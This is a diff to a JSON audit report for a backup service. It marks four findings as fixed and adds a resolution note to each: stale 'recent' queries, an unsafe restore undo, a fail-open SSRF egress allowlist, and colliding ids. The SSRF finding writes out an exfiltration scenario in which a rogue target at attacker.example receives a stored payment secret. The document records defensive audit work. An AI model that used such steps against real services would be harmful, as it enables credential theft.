@@ -536,47 +536,51 @@
       "issues": [
         {
           "id": "backup-service-01",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "bug",
           "severity": "high",
           "file": "app/core/runs.py",
           "line": 32,
           "title": "recent() returns the OLDEST rows, not the newest — 'latest run' is actually the earliest",
           "detail": "recent(limit) does `scan_all(_COLL, limit)` then sorts and takes [:limit]. But scan_all is bounded and deterministically ordered by KEY ascending (postgres: `ORDER BY key LIMIT n`; memory: insertion order sliced). Run ids are `run_<UTC-timestamp>` so key-ascending == chronological, meaning scan_all returns the n OLDEST rows. Sorting those newest-first still only yields the newest among the oldest n. When total rows > limit the genuinely newest runs are never fetched. Worst with recent(1): scan_all(coll,1) returns the single oldest run. internal.py:295 `tenant_coverage` uses `recent(1)` as 'the latest run', and drill._latest_verified / health staleness all read recent(). Same defect in RestoreStore.recent (restores.py:29) and DrillStore.recent (drills.py:28).",
-          "failure_scenario": "A tenant has 50 backup runs. Operator calls GET /internal/backup/tenant-coverage?tenant=shopX with no run id. recent(1) returns run #1 (the oldest, weeks-old, possibly before shopX existed). The dispute-defense answer reports 'not covered / not verified' for a tenant whose data is in fact backed up and verified in the newest run — a false negative used in a legal/case timeline. Symmetrically, an old run where a service failed makes health/tenant-coverage report stale/critical while current backups are green."
+          "failure_scenario": "A tenant has 50 backup runs. Operator calls GET /internal/backup/tenant-coverage?tenant=shopX with no run id. recent(1) returns run #1 (the oldest, weeks-old, possibly before shopX existed). The dispute-defense answer reports 'not covered / not verified' for a tenant whose data is in fact backed up and verified in the newest run — a false negative used in a legal/case timeline. Symmetrically, an old run where a service failed makes health/tenant-coverage report stale/critical while current backups are green.",
+          "resolution": "FIXED: recent() (runs/restores/drills) reads the whole bounded collection and sorts newest-first, instead of taking scan_all(coll,limit) which returned the key-ascending OLDEST rows — recent(1) was the earliest run. Regression: test_audit_fixes.py."
         },
         {
           "id": "backup-service-02",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "correctness",
           "severity": "high",
           "file": "app/core/restore.py",
           "line": 190,
           "title": "Per-tenant restore takes a tenant-scoped snapshot but performs a WHOLE-SERVICE overwrite — undo cannot roll back",
           "detail": "In _restore_one the `tenant` argument is used ONLY to scope the pre-restore snapshot (_snapshot -> export {'tenant': tenant}, restore.py:225-227). The actual restore reads the full stored run archive (result['archive_key']) and POSTs it to the target's /internal/backup/import with `overwrite` and `into_tenant` but NO tenant filter (restore.py:198-209). import_archive (core/backup.py:125) has no tenant filter either. So a run captured whole-service (run_backup_now default tenant='') is always restored across ALL tenants, while the operator-supplied `tenant` (echoed by plan() but never used to filter, restore.py:99-125) implies scoping that does not occur. Because the safety snapshot only captured one tenant, undo() (restore.py:237) re-applies only that tenant's snapshot.",
-          "failure_scenario": "Operator restores whole-service run R with tenant='shopX', overwrite=True, safety_snapshot=True, believing only shopX is affected. import overwrites every tenant's rows from the archive. The restore turns out wrong; operator calls undo, which only restores shopX's snapshot. All OTHER tenants' rows overwritten by the restore are permanently lost, despite Rule 2's 'snapshot before you overwrite / a restore you cannot roll back' guarantee."
+          "failure_scenario": "Operator restores whole-service run R with tenant='shopX', overwrite=True, safety_snapshot=True, believing only shopX is affected. import overwrites every tenant's rows from the archive. The restore turns out wrong; operator calls undo, which only restores shopX's snapshot. All OTHER tenants' rows overwritten by the restore are permanently lost, despite Rule 2's 'snapshot before you overwrite / a restore you cannot roll back' guarantee.",
+          "resolution": "FIXED (undo safety): the pre-restore snapshot is now whole-service (tenant=\"\"), matching what the restore overwrites, so undo() can actually roll back the full overwrite. The tenant arg never scoped the restore (import has no tenant filter); a partial snapshot was the unsafe part. Filtered per-tenant restore remains a separate feature."
         },
         {
           "id": "backup-service-03",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "security",
           "severity": "high",
           "file": "app/core/internal_http.py",
           "line": 30,
           "title": "SSRF egress allowlist fails OPEN by default, enabling internal-token/secret exfiltration to any host",
           "detail": "_check_host only enforces when the allowlist is non-empty: `if allowed_hosts and host not in allowed_hosts`. EGRESS_ALLOWED_HOSTS defaults to '' (config.py:349) so egress_allowed_hosts is an empty frozenset and the host check is skipped entirely — every outbound call (backup export/import to a target, alert webhook) may reach any host. Combined with target registration (POST /internal/backup/targets, default-open internal policy) an attacker sets base_url to a host they control and token_ref to the NAME of an existing stored operator secret; token_resolver resolves that secret's plaintext (secret_store.get) and post_json sends it as the X-Internal-Token header to the attacker host. No scheme restriction either (urllib), so file:// and similar are reachable on operator/registry-set URLs.",
-          "failure_scenario": "Holder of the shared internal token (or platform.backup operator) POSTs /internal/backup/targets {service:'x', base_url:'http://attacker.example', token_ref:'TAP_SECRET_KEY'} then POSTs /internal/backup/run. With the default empty allowlist, backup-service resolves TAP_SECRET_KEY and POSTs it in the X-Internal-Token header to attacker.example — plaintext payment credential exfiltrated. The comment claims the allowlist 'makes the destination a decision an operator made', but the shipped default disables it."
+          "failure_scenario": "Holder of the shared internal token (or platform.backup operator) POSTs /internal/backup/targets {service:'x', base_url:'http://attacker.example', token_ref:'TAP_SECRET_KEY'} then POSTs /internal/backup/run. With the default empty allowlist, backup-service resolves TAP_SECRET_KEY and POSTs it in the X-Internal-Token header to attacker.example — plaintext payment credential exfiltrated. The comment claims the allowlist 'makes the destination a decision an operator made', but the shipped default disables it.",
+          "resolution": "FIXED: egress is fail-CLOSED — an empty EGRESS_ALLOWED_HOSTS now refuses ALL outbound (was: skipped the check, any host), scheme restricted to http/https, cloud metadata endpoints blocked unconditionally. Closes internal-token/secret exfil via a rogue target. Regression: test_audit_fixes.py."
         },
         {
           "id": "backup-service-04",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "correctness",
           "severity": "medium",
           "file": "app/core/orchestrator.py",
           "line": 177,
           "title": "Run/restore/drill ids use second-granularity timestamps — two operations in the same second collide and overwrite",
           "detail": "run_id = f\"run_{self._iso().replace(':','').replace('-','')}\" where iso() is '%Y-%m-%dT%H:%M:%SZ' (whole seconds). Same pattern for restore_id (restore.py:133), undo_id (restore.py:247) and drill ids (drill.py:74). Archive object keys are '{run_id}/{service}.json' (orchestrator.py:113) and records are stored by id (RunStore.record put by id). Two runs starting in the same second produce the same id, so the second run's archives overwrite the first's object keys and RunStore.record overwrites the first run record.",
-          "failure_scenario": "An operator triggers an out-of-band run (POST /backup/run) in the same second a cron-scheduled run fires. Both build id run_20260912T031500Z; the second put overwrites the first run's record and its per-service archive objects, silently merging/destroying one run's results and leaving dangling references — the exact 'a miss is never dropped' honesty guarantee is broken by a lost run record."
+          "failure_scenario": "An operator triggers an out-of-band run (POST /backup/run) in the same second a cron-scheduled run fires. Both build id run_20260912T031500Z; the second put overwrites the first run's record and its per-service archive objects, silently merging/destroying one run's results and leaving dangling references — the exact 'a miss is never dropped' honesty guarantee is broken by a lost run record.",
+          "resolution": "FIXED: run/restore/undo/drill ids append secrets.token_hex(3) to the second-granularity timestamp, so two operations in the same second no longer collide and overwrite each other archives/records."
         }
       ]
     },
